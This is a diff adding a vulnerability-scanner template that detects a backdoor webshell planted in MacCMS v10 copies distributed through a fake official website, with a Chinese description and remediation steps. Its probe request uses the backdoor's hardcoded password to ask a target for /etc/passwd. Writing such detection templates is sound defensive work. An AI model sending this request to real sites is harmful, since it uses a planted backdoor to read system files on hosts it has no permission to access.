@@ -1,0 +1,37 @@
+id: maccmsv10-backdoo
+info:
+  name: Maccmsv10 Backdoor
+  author:
+  - l0ne1y
+  tags:
+  - maccmsv10
+  - rce
+  description: |-
+    Maccmsv10隐藏后门漏洞
+    某天始，MacCMS官网因为某些原因停摆。同时在百度搜索苹果CMS或MacCMS出现的排名第一均为一个：www.maccmsv10.com的网址，而真正的官网地址是www.maccms.com。前者使用了一个和maccms官网一模一样的静态首页提供程序下载。最近几天陆续有人发现了从这个网站下载的苹果CMS程序存在后门webshell。
+
+    直接从该第三方站点下载了源码，至今依然存在后门，所以基本可确信是故意搭建的假冒官网。
+  severity: critical
+  remediation: |-
+    1.排查你的程序是否存在上面的后门路径文件
+    2.如果存在，删除后门文件，并进行全盘查杀扫描
+    3.手动查看可疑文件是存存在隐藏后门
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - 扫描后门
+    - 反弹端口
+    - 文件管理
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
+  method: POST
+  body: getpwd=WorldFilledWithLove
+  headers:
+    Content-Type: application/x-www-form-urlencoded
